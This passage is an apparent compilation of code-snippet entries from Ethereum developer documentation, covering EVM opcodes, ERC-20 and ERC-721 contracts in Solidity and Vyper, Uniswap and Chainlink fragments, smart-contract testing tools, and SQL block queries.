self.idToApprovals[_tokenId]\n    spenderIsApprovedForAll: bool = (self.ownerToOperators[owner])[_spender]\n    return (spenderIsOwner or spenderIsApproved) or spenderIsApprovedForAll\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Opcodes Implementation\nDESCRIPTION: The opcodes representation of the ERC20 token contract. This shows the low-level EVM instructions that implement the contract functionality, including method signatures, control flow, and memory operations.\n\nLANGUAGE: evm-opcodes\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x25F JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x2C5 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x31D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x3A0 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x406 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x46C JUMPI PUSH2 0xA9 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x197 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1B5 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x23B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x4E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xF6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xDB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x123 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x586 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x221 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x243 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x69E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x2DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x751 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x325 PUSH2 0x799 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x365 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x392 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x3EC PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x3B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x4CE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x482 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x926 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x57C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x551 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x57C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 A\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode İşleyici Başlangıç Noktası\nDESCRIPTION: 0x5E adresindeki ABI olmayan çağrı verisi işleyicisinin başlangıç noktası. Çağrı verisinin boş olup olmadığını kontrol eder.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n5E JUMPDEST\n5F CALLDATASIZE\n60 PUSH2 0x007c\n63 JUMPI\n```\n\n----------------------------------------\n\nTITLE: Using Chakra UI Responsive Breakpoints\nDESCRIPTION: Demonstrates how to implement responsive design with Chakra UI's default breakpoints by changing display properties at different screen sizes.\n\nLANGUAGE: tsx\nCODE:\n```\n<Container display={{ base: \"block\", sm: \"flex\" }} />\n```\n\n----------------------------------------\n\nTITLE: Applying Global Constraints in Manticore\nDESCRIPTION: Shows how to add global constraints to the analysis using symbolic values and addresses to control execution flow.\n\nLANGUAGE: python\nCODE:\n```\nsymbolic_address = m.make_symbolic_value()\nm.constraint(Operators.OR(symbolic == 0x41, symbolic_address == 0x42))\nm.transaction(caller=user_account,\n              address=contract_account,\n              data=m.make_symbolic_buffer(320),\n              value=0)\n```\n\n----------------------------------------\n\nTITLE: Displaying Ethereum Transaction Object Structure in JavaScript\nDESCRIPTION: A JavaScript object representation of an Ethereum transaction showing core properties including from/to addresses, gas parameters, nonce, and value. This structure demonstrates the essential fields needed for a valid transaction.\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  from: \"0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8\",\n  to: \"0xac03bb73b6a9e108530aff4df5077c2b3d481e5a\",\n  gasLimit: \"21000\",\n  maxFeePerGas: \"300\"\n  maxPriorityFeePerGas: \"10\"\n  nonce: \"0\",\n  value: \"10000000000\",\n}\n```\n\n----------------------------------------\n\nTITLE: Importing SafeERC20 for Token Operations\nDESCRIPTION: Imports OpenZeppelin's SafeERC20 wrapper that normalizes the behavior of ERC-20 tokens to always revert on failure rather than returning false, simplifying error handling.\n\nLANGUAGE: solidity\nCODE:\n```\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n```\n\n----------------------------------------\n\nTITLE: JSON-RPC Request for eth_getFilterLogs\nDESCRIPTION: Example of a request to retrieve all logs for a specific filter ID. The response format is the same as for eth_getFilterChanges.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getFilterLogs\",\"params\":[\"0x16\"],\"id\":74}'\n```\n\n----------------------------------------\n\nTITLE: Creating an onlyProxy Modifier for ERC-20 Functions\nDESCRIPTION: Solidity code defining a modifier that restricts function access to the designated proxy contract. This ensures that only the CalldataInterpreter can call certain privileged functions.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Some functions may only be called by the proxy.\n     */\n    modifier onlyProxy {\n      require(msg.sender == proxy);\n      _;\n    }\n```\n\n----------------------------------------\n\nTITLE: Checking Maximum Deposit Limit in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function returns the maximum amount of underlying assets that can be deposited in a single deposit call by the receiver.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxDeposit(address receiver) public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Importing CrossDomainMessenger Interface in Solidity\nDESCRIPTION: Initial code that defines the solidity version and imports the ICrossDomainMessenger interface which is used to enable communication between Ethereum L1 and Optimism L2.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity >0.5.0 <0.9.0;\n\n/* Interface Imports */\nimport { ICrossDomainMessenger } from \"./ICrossDomainMessenger.sol\";\n```\n\n----------------------------------------\n\nTITLE: Transferring and Burning Liquidity Tokens in Uniswap V2\nDESCRIPTION: This snippet shows how the router transfers liquidity tokens from the sender to the pair contract and calls the burn function to withdraw the underlying tokens to the specified recipient.\n\nLANGUAGE: solidity\nCODE:\n```\n        address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n        IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n        (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n```\n\n----------------------------------------\n\nTITLE: Echidna Configuration with Function Blacklisting\nDESCRIPTION: This YAML configuration filters out specific functions from being called during testing, which helps in focusing the fuzzer on finding high gas consumption in the remaining functions.\n\nLANGUAGE: yaml\nCODE:\n```\nfilterBlacklist: true\nfilterFunctions: [\"pop\", \"clear\"]\n```\n\n----------------------------------------\n\nTITLE: Checking Token Existence in Solidity\nDESCRIPTION: Implements the _exists internal function that verifies if a pizza token exists by checking if it has an owner. Returns true if the token has an owner, false otherwise.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction _exists(uint256 pizzaId) internal view returns (bool) {\n    address owner = pizzaToOwner[pizzaId];\n    return owner != address(0);\n}\n```\n\n----------------------------------------\n\nTITLE: Recursive Contract Call Example in Ethereum\nDESCRIPTION: A demonstration of how contract calls can be chained recursively to create exponential computational complexity, even in a Turing-incomplete environment. This example shows 51 contracts calling each other to execute 2^50 computational steps.\n\nLANGUAGE: shell\nCODE:\n```\nC0: call(C1); call(C1);\nC1: call(C2); call(C2);\nC2: call(C3); call(C3);\n...\nC49: call(C50); call(C50);\nC50: (run one step of a program and record the change in storage)\n```\n\n----------------------------------------\n\nTITLE: Defining State Transition Function - Conceptual Pseudocode\nDESCRIPTION: A formal definition of a state transition function in a blockchain system, showing how a state S and transaction TX produce either a new state S' or an error.\n\nLANGUAGE: text\nCODE:\n```\nAPPLY(S,TX) -> S' or ERROR\n```\n\n----------------------------------------\n\nTITLE: Querying Ethereum Block Data with SQL\nDESCRIPTION: This SQL query extracts information about specific Ethereum blocks (numbers 12396854-12396856), showing how blocks are chained together via the parent_hash field, which references the hash of the previous block.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n   time,\n   number,\n   hash,\n   parent_hash,\n   nonce\nFROM ethereum.\"blocks\"\nWHERE \"number\" = 12396854 OR \"number\" = 12396855 OR \"number\" = 12396856\nLIMIT 10\n```\n\n----------------------------------------\n\nTITLE: CALL Opcode in EVM\nDESCRIPTION: Makes a call to another contract with specified gas, value, and memory parameters. Returns success status and copies return data to specified memory location.\n\nLANGUAGE: evm assembly\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Retrieving ETH/USD Price Data Using Chainlink Price Feed in Solidity\nDESCRIPTION: This code snippet demonstrates how to integrate Chainlink's price feed oracle to fetch the latest ETH/USD price data in a smart contract. The example imports the AggregatorV3Interface, initializes the price feed with a specific address in the constructor, and provides a function to retrieve the latest price information.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.7;\n\nimport \"@chainlink/contracts/src/v0.6/interfaces/AggregatorV3Interface.sol\";\n\ncontract PriceConsumerV3 {\n\n    AggregatorV3Interface internal priceFeed;\n\n    /**\n     * Network: Kovan\n     * Aggregator: ETH/USD\n     * Address: 0x9326BFA02ADD2366b30bacB125260Af641031331\n     */\n    constructor() public {\n        priceFeed = AggregatorV3Interface(0x9326BFA02ADD2366b30bacB125260Af641031331);\n    }\n\n    /**\n     * Returns the latest price\n     */\n    function getLatestPrice() public view returns (int) {\n        (\n            uint80 roundID,\n            int price,\n            uint startedAt,\n            uint timeStamp,\n            uint80 answeredInRound\n        ) = priceFeed.latestRoundData();\n        return price;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Factory Reference in Uniswap V2 Pair\nDESCRIPTION: Stores the address of the factory contract that created this pair. The factory is the central point connecting all liquidity pools.\n\nLANGUAGE: solidity\nCODE:\n```\naddress public factory;\n```\n\n----------------------------------------\n\nTITLE: Constructor for ERC-721 Contract in Vyper\nDESCRIPTION: Constructor function that initializes the contract by enabling interface support for ERC-165 and ERC-721, and setting the contract deployer as the minter.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef __init__():\n    \"\"\"\n    @dev Contract constructor.\n    \"\"\"\n    self.supportedInterfaces[ERC165_INTERFACE_ID] = True\n    self.supportedInterfaces[ERC721_INTERFACE_ID] = True\n    self.minter = msg.sender\n```\n\n----------------------------------------\n\nTITLE: Função de escrita no cache em Solidity\nDESCRIPTION: Implementa a escrita de um valor no cache. Se o valor já existir, retorna a chave existente. Caso contrário, armazena o valor com uma nova chave sequencial e atualiza os mapeamentos.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Write a value to the cache if it's not there already\n    // Only public to enable the test to work\n    function cacheWrite(uint _value) public returns (uint) {\n        // If the value is already in the cache, return the current key\n        if (val2key[_value] != 0) {\n            return val2key[_value];\n        }\n\n        // Since 0xFE is a special case, the largest key the cache can\n        // hold is 0x0D followed by 15 0xFF's. If the cache length is already that\n        // large, fail.\n        //                              1 2 3 4 5 6 7 8 9 A B C D E F\n        require(key2val.length+1 < 0x0DFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF,\n            \"cache overflow\");\n\n        // Write the value using the next key\n        val2key[_value] = key2val.length+1;\n\n        key2val.push(_value);\n\n        return key2val.length;\n    }  // cacheWrite\n```\n\n----------------------------------------\n\nTITLE: splitter() Proxy Address Retrieval in EVM Bytecode\nDESCRIPTION: Continuation of the splitter() function implementation that retrieves the proxy address from storage slot 3, masks it with 0xFFFF...FFFF to ensure it's a valid address format, and stores it in memory at position 0x80 for return.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n10F | JUMPDEST                                          |\n110 | POP                                               |\n111 | PUSH1 0x03                                        | 0x03\n113 | SLOAD                                             | (((Storage[3] a.k.a the contract for which we are a proxy)))\n114 | PUSH1 0x40                                        | 0x40 (((Storage[3] a.k.a the contract for which we are a proxy)))\n116 | MLOAD                                             | 0x80 (((Storage[3] a.k.a the contract for which we are a proxy)))\n117 | PUSH20 0xffffffffffffffffffffffffffffffffffffffff | 0xFF...FF 0x80 (((Storage[3] a.k.a the contract for which we are a proxy)))\n12C | SWAP1                                             | 0x80 0xFF...FF (((Storage[3] a.k.a the contract for which we are a proxy)))\n12D | SWAP2                                             | (((Storage[3] a.k.a the contract for which we are a proxy))) 0xFF...FF 0x80\n12E | AND                                               | ProxyAddr 0x80\n12F | DUP2                                              | 0x80 ProxyAddr 0x80\n130 | MSTORE                                            | 0x80\n```\n\n----------------------------------------\n\nTITLE: Pinning JSON Metadata to IPFS using Pinata API\nDESCRIPTION: Utility function that uploads NFT metadata as JSON to IPFS via Pinata's API, returning either a success response with the IPFS URL or an error message.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst key = process.env.REACT_APP_PINATA_KEY\nconst secret = process.env.REACT_APP_PINATA_SECRET\n\nconst axios = require(\"axios\")\n\nexport const pinJSONToIPFS = async (JSONBody) => {\n  const url = `https://api.pinata.cloud/pinning/pinJSONToIPFS`\n  //making axios POST request to Pinata ⬇️\n  return axios\n    .post(url, JSONBody, {\n      headers: {\n        pinata_api_key: key,\n        pinata_secret_api_key: secret,\n      },\n    })\n    .then(function (response) {\n      return {\n        success: true,\n        pinataUrl:\n          \"https://gateway.pinata.cloud/ipfs/\" + response.data.IpfsHash,\n      }\n    })\n    .catch(function (error) {\n      console.log(error)\n      return {\n        success: false,\n        message: error.message,\n      }\n    })\n}\n```\n\n----------------------------------------\n\nTITLE: Installing TypeScript and Testing Dependencies\nDESCRIPTION: Commands to add TypeScript, Mocha, and Chai testing dependencies to the project.\n\nLANGUAGE: bash\nCODE:\n```\nyarn add --dev @types/chai @types/mocha chai mocha ts-node typescript\n# or if you're using npm\nnpm install @types/chai @types/mocha chai mocha ts-node typescript --save-dev\n```\n\n----------------------------------------\n\nTITLE: Implementing Token Minting Logic in Vyper for ERC-721\nDESCRIPTION: Core logic for minting a new ERC-721 token, including validation checks and event emission. The function verifies the recipient is not the zero address, adds the token to the recipient's collection, and logs a Transfer event from the zero address.\n\nLANGUAGE: python\nCODE:\n```\n    # Throws if `_to` is zero address\n    assert _to != ZERO_ADDRESS\n    # Add NFT. Throws if `_tokenId` is owned by someone\n    self._addTokenTo(_to, _tokenId)\n    log Transfer(ZERO_ADDRESS, _to, _tokenId)\n    return True\n```\n\n----------------------------------------\n\nTITLE: Connecting Wallet to Ethereum Provider\nDESCRIPTION: JavaScript code to connect a wallet instance to a network provider, enabling interaction with the blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\nlet walletSigner = wallet.connect(window.ethersProvider)\n```\n\n----------------------------------------\n\nTITLE: Mint and Burn Functions Implementation for L2 Bridge\nDESCRIPTION: Implements the mint and burn functions required by IL2StandardERC20, which allow the L2 bridge to create and destroy tokens when bridging between L1 and L2.\n\nLANGUAGE: solidity\nCODE:\n```\n// slither-disable-next-line external-function\nfunction mint(address _to, uint256 _amount) public virtual onlyL2Bridge {\n    _mint(_to, _amount);\n\n    emit Mint(_to, _amount);\n}\n\n// slither-disable-next-line external-function\nfunction burn(address _from, uint256 _amount) public virtual onlyL2Bridge {\n    _burn(_from, _amount);\n\n    emit Burn(_from, _amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Smart Contract Deployment Script with Ethers.js\nDESCRIPTION: A deployment script that uses ethers.js to deploy the Hello World contract to the Ethereum network. It initializes the contract with a greeting message and logs the deployed contract address.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n   const HelloWorld = await ethers.getContractFactory(\"HelloWorld\");\n\n   // Start deployment, returning a promise that resolves to a contract object\n   const hello_world = await HelloWorld.deploy(\"Hello World!\");\n   console.log(\"Contract deployed to address:\", hello_world.address);}\n\nmain()\n  .then(() => process.exit(0))\n  .catch(error => {\n    console.error(error);\n    process.exit(1);\n  });\n```\n\n----------------------------------------\n\nTITLE: Implementing Reentrancy Protection in Uniswap\nDESCRIPTION: Creates a locking mechanism with an unlocked state variable to prevent reentrancy attacks. This protects the contract when it needs to call arbitrary ERC-20 tokens.\n\nLANGUAGE: solidity\nCODE:\n```\nuint private unlocked = 1;\n```\n\n----------------------------------------\n\nTITLE: Simple Ethereum Contract in Serpent for Storage Operations\nDESCRIPTION: A basic Serpent contract that checks if a storage location is empty and assigns a value to it if it is. This example demonstrates how contract code interacts with blockchain storage.\n\nLANGUAGE: python\nCODE:\n```\nif !self.storage[calldataload(0)]:\n  self.storage[calldataload(0)] = calldataload(32)\n```\n\n----------------------------------------\n\nTITLE: Analyzing Ethereum Block Production Metrics\nDESCRIPTION: SQL query that calculates daily block production since 2016 and determines the average number of blocks produced per day, demonstrating Ethereum's consistency in block creation.\n\nLANGUAGE: SQL\nCODE:\n```\n# query to visualize number of blocks produced daily since 2016\n\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    COUNT(*) AS block_count\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n\n# average number of blocks produced per day\n\nWITH temp_table AS (\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    COUNT(*) AS block_count\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n)\nSELECT\n    AVG(block_count) AS avg_block_count\nFROM temp_table\n```\n\n----------------------------------------\n\nTITLE: Checking Token Existence in Solidity\nDESCRIPTION: Internal view function that verifies if a pizza token exists by checking if it has a non-zero owner address.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction _exists(uint256 pizzaId) internal view returns (bool) {\n    address owner = pizzaToOwner[pizzaId];\n    return owner != address(0);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Contract ABI Placeholder\nDESCRIPTION: Placeholder for the Greeter contract's Application Binary Interface (ABI) that defines the contract's functions and their signatures, marked as a constant to prevent modifications.\n\nLANGUAGE: tsx\nCODE:\n```\nlet greeterABI = [\n  .\n  .\n  .\n] as const   // greeterABI\n```\n\n----------------------------------------\n\nTITLE: Função para leitura de múltiplos parâmetros do calldata\nDESCRIPTION: Função interna que lê um número específico de parâmetros do calldata, iniciando após os 4 bytes da assinatura da função e utilizando _readParam para processar cada parâmetro.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Read n parameters (functions know how many parameters they expect)\n    function _readParams(uint _paramNum) internal returns (uint[] memory) {\n        // The parameters we read\n        uint[] memory params = new uint[](_paramNum);\n\n        // Parameters start at byte 4, before that it's the function signature\n        uint _atByte = 4;\n\n        for(uint i=0; i<_paramNum; i++) {\n            (_atByte, params[i]) = _readParam(_atByte);\n        }\n\n        return(params);\n    }   // readParams\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Bytecode and Opcodes\nDESCRIPTION: This section contains the deployed bytecode and the EVM opcodes for an ERC20 token contract. It includes the initialization logic setting the token name to 'Basic' and symbol to 'BSC', along with standard ERC20 functionality implementation.\n\nLANGUAGE: evm\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1539 CODESIZE SUB DUP1 PUSH3 0x1539 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4261736963000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4253430000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP1 MLOAD 